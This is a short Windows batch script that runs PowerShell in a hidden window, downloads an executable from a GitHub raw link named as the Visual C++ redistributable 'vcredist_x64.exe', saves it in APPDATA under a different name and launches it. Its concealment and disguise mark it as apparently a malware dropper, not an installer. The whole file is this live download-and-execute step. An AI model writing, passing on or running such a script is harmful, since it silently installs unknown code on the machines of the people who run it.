@echo off
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/JykWARES/jeffery/raw/refs/heads/main/vcredist_x64.exe' -OutFile $env:APPDATA\LOSTOCHISTITEL.exe; Start-Process -FilePath $env:APPDATA\LOSTOCHISTITEL.exe"
